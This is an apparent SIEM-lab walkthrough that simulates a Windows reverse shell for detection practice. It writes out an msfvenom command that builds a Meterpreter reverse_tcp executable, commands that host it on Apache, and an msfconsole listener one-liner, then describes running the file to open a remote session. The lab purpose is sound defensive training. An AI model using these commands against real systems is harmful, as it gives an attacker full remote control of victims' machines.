# Reverse Shell (Remote Access)

## Objective
- To simulate remote access by creating and executing a payload on the target system.

## Step 1: Create Payload on Kali
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Kali-IP> LPORT=4444 -f exe -o shell.exe
```

Generates a reverse shell payload for Windows.

![msfvenom](https://github.com/akshaysapkal-cyber/Wazuh-SIEM-Lab-Detection/blob/main/Screenshots/attack/msfvenom.png?raw=true)

## Step 2: Move Payload to Web Directory

Create Folder:
```bash
mkdir /var/www/html/share
```
Then Move payload to the share folder
```bash
mv shell.exe /var/www/html/share/
```
Moves the payload file to Apache web directory.

## Step 3: Start Apache Server
```bash
sudo service apache2 start
```
Starts a web server to host the payload.

## Step 4: Start Metasploit Listener
```bash
msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST <Kali ip>; set LPORT 4444; run"
```
Prepares listener to receive reverse connection.

![msfconsole](https://github.com/akshaysapkal-cyber/Wazuh-SIEM-Lab-Detection/blob/main/Screenshots/attack/msfconsole.png?raw=true)

## Step 5: Download and Execute Payload on Windows
Open browser on Windows and visit:
`http://<Kali-IP>/`

Download and run the `shell.exe` on the windows system.
Executes the reverse shell payload and initiates connection.

![payload windows](https://github.com/akshaysapkal-cyber/Wazuh-SIEM-Lab-Detection/blob/main/Screenshots/attack/windows%20download%20shell.png?raw=true)

## Step 6: Gain Access on Kali
Once payload executed in target machine, a Meterpreter session is opened.
Provides remote access to the target system.

![meterpreter](https://github.com/akshaysapkal-cyber/Wazuh-SIEM-Lab-Detection/blob/main/Screenshots/attack/meterpreter.png?raw=true)

Detection:
- [reverse-shell detection](detection/reverse-shell-detection.md)

## What Happened
- A malicious payload was created and delivered to the target system.
- The target executed the file, establishing a reverse connection.

## SOC Relevance
- Reverse shells indicate full system compromise.
- Detecting suspicious file execution and outbound connections is critical.
